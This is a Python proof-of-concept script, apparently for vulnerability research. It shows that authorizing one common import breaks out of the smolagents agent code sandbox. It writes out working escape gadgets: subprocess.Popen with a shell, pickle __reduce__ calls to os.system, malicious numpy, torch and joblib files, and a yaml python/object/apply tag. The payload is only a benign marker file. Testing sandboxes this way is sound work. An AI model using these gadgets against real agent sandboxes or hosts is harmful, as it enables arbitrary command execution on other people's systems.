#!/usr/bin/env python
"""Prove: authorizing a common module turns the smolagents sandbox into a shell.

smolagents' LocalPythonExecutor lets a deployment widen additional_authorized_imports
(every tutorial does, so the agent can use pandas/numpy/torch/etc). But its guard
check_safer_result NEVER inspects class objects and denylists only 9 functions, so a
re-exported exec-capable class or non-denylisted function sails straight through.

For each module, we authorize ONLY that module (exactly as a deployment would),
run attacker Python in the REAL sandbox, and confirm command execution by a benign
marker file written to a temp dir. No network, no payload beyond `echo <token>`.
"""
from __future__ import annotations

import os
import pickle
import tempfile
import uuid

from harness.frameworks import SmolagentsLocalAdapter


WORK = os.path.join(tempfile.gettempdir(), "ijl_rce_imports")
os.makedirs(WORK, exist_ok=True)


def marker_cmd(tok: str, path: str) -> str:
    p = path.replace("/", "\\") if os.name == "nt" else path
    return (f'cmd /c echo {tok}> "{p}"' if os.name == "nt"
            else f"/bin/sh -c 'echo {tok} > \"{p}\"'")


def evil_pickle_bytes(tok: str, marker: str) -> bytes:
    cmd = marker_cmd(tok, marker)

    class Exploit:
        def __reduce__(self):
            import os as _os
            return (_os.system, (cmd,))

    return pickle.dumps(Exploit())


def write_evil_file(tok: str, marker: str, kind: str) -> str:
    """Write a malicious serialized file for load()-style gadgets."""
    path = os.path.join(WORK, f"payload_{kind}.bin")
    data = evil_pickle_bytes(tok, marker)
    if kind == "numpy":
        import numpy as np
        path = os.path.join(WORK, "payload_numpy.npy")

        class Exploit:
            def __reduce__(self):
                import os as _os
                return (_os.system, (marker_cmd(tok, marker),))
        np.save(path, np.array([Exploit()], dtype=object), allow_pickle=True)
        return path
    with open(path, "wb") as fh:
        fh.write(data)
    return path


def cases():
    out = []

    # 1. subprocess.Popen -- a CLASS, so check_safer_result never looks at it
    out.append(("subprocess", "subprocess.Popen (class)", lambda tok, mk:
                "import subprocess\n"
                f"subprocess.Popen({marker_cmd(tok, mk)!r}, shell=True).wait()\n"))

    # 2. pickle.loads -- not among the 9 denylisted functions
    def pickle_case(tok, mk):
        b = evil_pickle_bytes(tok, mk)
        return "import pickle\n" f"pickle.loads({b!r})\n"
    out.append(("pickle", "pickle.loads (deserialization gadget)", pickle_case))

    # 3-5. load()-style deserialization gadgets a data agent authorizes
    for mod, call in (("joblib", "joblib.load"),
                      ("torch", "torch.load"),
                      ("numpy", "numpy.load")):
        def mk_case(tok, mk, mod=mod, call=call):
            p = write_evil_file(tok, mk, mod).replace("\\", "/")
            if mod == "numpy":
                return f"import numpy\nnumpy.load({p!r}, allow_pickle=True)\n"
            if mod == "torch":
                return (f"import torch\ntorch.load({p!r}, "
                        "weights_only=False)\n")
            return f"import {mod}\n{call}({p!r})\n"
        out.append((mod, f"{call} (deserialization gadget)", mk_case))

    # 6. yaml.load without SafeLoader -> python/object tag
    def yaml_case(tok, mk):
        cmd = marker_cmd(tok, mk)
        doc = ("!!python/object/apply:os.system ['" + cmd + "']\n")
        return "import yaml\n" f"yaml.load({doc!r}, Loader=yaml.Loader)\n"
    out.append(("yaml", "yaml.load (python/object tag)", yaml_case))

    return out


def main() -> int:
    print("Proving RCE-on-authorize against the REAL smolagents LocalPythonExecutor\n")
    results = []
    for mod, label, build in cases():
        tok = "RCE-" + uuid.uuid4().hex[:12]
        marker = os.path.join(WORK, f"marker_{mod}.txt")
        if os.path.exists(marker):
            os.remove(marker)
        try:
            code = build(tok, marker)
        except Exception as e:  # noqa: BLE001 (module not installed, etc.)
            print(f"  [skip ] authorize {mod:10} {label}: {type(e).__name__}: {e}")
            continue
        adapter = SmolagentsLocalAdapter(authorized_imports=[mod])
        r = adapter.run_code(code)
        executed = os.path.exists(marker) and tok in open(marker).read()
        verdict = "RCE   " if executed else ("blocked" if r.returncode else "ran-no-exec")
        results.append((mod, executed))
        print(f"  [{verdict}] authorize {mod:10} -> {label}")
        if not executed and r.stderr:
            print(f"            guard: {r.stderr.strip()[:150]}")
    got = [m for m, ok in results if ok]
    print(f"\n[*] RCE achieved by authorizing any one of: {got}")
    print("[*] each used exactly one commonly-authorized import; no default-config escape needed.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
